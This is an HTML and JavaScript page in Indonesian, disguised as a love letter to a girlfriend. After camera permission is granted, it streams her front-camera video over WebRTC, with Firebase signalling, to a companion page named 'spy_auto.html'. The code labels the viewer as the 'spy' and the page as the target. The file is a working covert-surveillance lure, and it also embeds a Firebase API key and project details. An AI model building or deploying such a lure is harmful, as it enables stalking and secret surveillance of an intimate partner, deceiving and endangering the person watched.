<!DOCTYPE html>
<html>
<head>
    <title>ðŸ’Œ Surat Cinta</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #ff6b9d, #ff8e53);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            width: 100%;
            max-width: 500px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        h1 { color: #ff4081; margin-bottom: 20px; }
        #status { margin: 20px 0; min-height: 24px; }
        #video { width: 100%; border-radius: 10px; margin: 20px 0; display: none; }
        #shareLink { 
            background: #f0f0f0; 
            padding: 10px; 
            border-radius: 5px; 
            margin: 10px 0;
            font-family: monospace;
            word-break: break-all;
            display: none;
        }
        button {
            background: #ff4081;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px;
        }
        .qr-container {
            margin: 20px 0;
            display: none;
        }
        #qrcode {
            width: 200px;
            height: 200px;
            margin: 0 auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ðŸ’– Untuk Pacarku</h1>
        <p>Sayang, izinkan aku melihat senyuman indahmu...</p>
        
        <button onclick="startCamera()">ðŸ“¸ Izinkan Kamera</button>
        
        <div id="status">Klik tombol di atas untuk memulai</div>
        
        <div id="shareLink"></div>
        
        <div class="qr-container" id="qrContainer">
            <p>Scan QR code ini dari HP lain:</p>
            <canvas id="qrcode"></canvas>
        </div>
        
        <video id="video" autoplay playsinline muted></video>
    </div>

    <!-- Firebase & QR Code -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
    
    <script>
        // ========== CONFIG ==========
        const firebaseConfig = {
            apiKey: "AIzaSyBYW92p7arkxHse0Lo3z6xoe_7G43vHBRU",
            authDomain: "survei-f11a1.firebaseapp.com",
            databaseURL: "https://survei-f11a1-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "survei-f11a1",
            storageBucket: "survei-f11a1.firebasestorage.app",
            messagingSenderId: "769641850914",
            appId: "1:769641850914:web:3be7b2cf7f6cb09ab9427b"
        };
        
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        
        // ========== VARIABLES ==========
        let localStream;
        let peerConnection;
        let roomId;
        let offerListener;
        let candidateListener;
        
        // ========== GENERATE ROOM ID ==========
        function generateRoomId() {
            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'; // No confusing chars
            let result = '';
            for (let i = 0; i < 6; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }
        
        // ========== START CAMERA ==========
        async function startCamera() {
            const btn = event.target;
            const status = document.getElementById('status');
            
            btn.disabled = true;
            btn.textContent = "ðŸ”„ Memulai...";
            
            try {
                // 1. GET CAMERA
                localStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: 640, height: 480 },
                    audio: false
                });
                
                const video = document.getElementById('video');
                video.srcObject = localStream;
                video.style.display = 'block';
                video.style.transform = 'scaleX(-1)';
                
                // 2. CREATE ROOM
                roomId = generateRoomId();
                await database.ref('rooms/' + roomId).remove(); // Clean old
                
                // 3. CREATE SHARE LINK
                const shareLink = `${window.location.origin}${window.location.pathname.replace('target_auto.html', 'spy_auto.html')}?room=${roomId}`;
                
                document.getElementById('shareLink').style.display = 'block';
                document.getElementById('shareLink').innerHTML = `
                    <strong>Share link ini ke pacarmu:</strong><br>
                    <a href="${shareLink}" target="_blank">${shareLink}</a>
                    <br><br>
                    <strong>Atau scan QR code:</strong>
                `;
                
                // 4. GENERATE QR CODE
                document.getElementById('qrContainer').style.display = 'block';
                QRCode.toCanvas(document.getElementById('qrcode'), shareLink, {
                    width: 200,
                    margin: 2,
                    color: {
                        dark: '#ff4081',
                        light: '#ffffff'
                    }
                });
                
                // 5. SETUP WEBRTC
                setupWebRTC();
                
                // 6. SETUP LISTENERS
                setupListeners();
                
                status.innerHTML = "âœ… Kamera aktif! Bagikan link di atas ke pacarmu";
                
            } catch (error) {
                status.innerHTML = `âŒ Error: ${error.message}`;
                btn.disabled = false;
                btn.textContent = "ðŸ“¸ Izinkan Kamera";
            }
        }
        
        // ========== WEBRTC SETUP ==========
        function setupWebRTC() {
            peerConnection = new RTCPeerConnection({
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' }
                ]
            });
            
            localStream.getTracks().forEach(track => {
                peerConnection.addTrack(track, localStream);
            });
            
            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    database.ref(`rooms/${roomId}/targetCandidates`).push(event.candidate.toJSON());
                }
            };
        }
        
        // ========== SETUP LISTENERS ==========
        function setupListeners() {
            offerListener = database.ref(`rooms/${roomId}/offer`).on('value', async (snapshot) => {
                const offer = snapshot.val();
                if (offer && peerConnection.signalingState === 'stable') {
                    console.log("ðŸ“¥ Offer received from spy");
                    
                    await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
                    
                    const answer = await peerConnection.createAnswer();
                    await peerConnection.setLocalDescription(answer);
                    
                    await database.ref(`rooms/${roomId}/answer`).set(answer);
                    
                    document.getElementById('status').innerHTML = "ðŸ”´ Terhubung dengan pacar!";
                }
            });
            
            candidateListener = database.ref(`rooms/${roomId}/spyCandidates`).on('child_added', async (snapshot) => {
                const candidate = snapshot.val();
                if (candidate) {
                    try {
                        await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
                    } catch (e) {
                        console.warn("Failed to add ICE candidate:", e);
                    }
                }
            });
        }
        
        // ========== CLEANUP ==========
        function cleanup() {
            if (offerListener) database.ref(`rooms/${roomId}/offer`).off('value', offerListener);
            if (candidateListener) database.ref(`rooms/${roomId}/spyCandidates`).off('child_added', candidateListener);
            if (localStream) localStream.getTracks().forEach(track => track.stop());
            if (peerConnection) peerConnection.close();
            if (roomId) database.ref('rooms/' + roomId).remove();
        }
        
        window.addEventListener('beforeunload', cleanup);
        window.addEventListener('pagehide', cleanup);
    </script>
</body>
        </html>
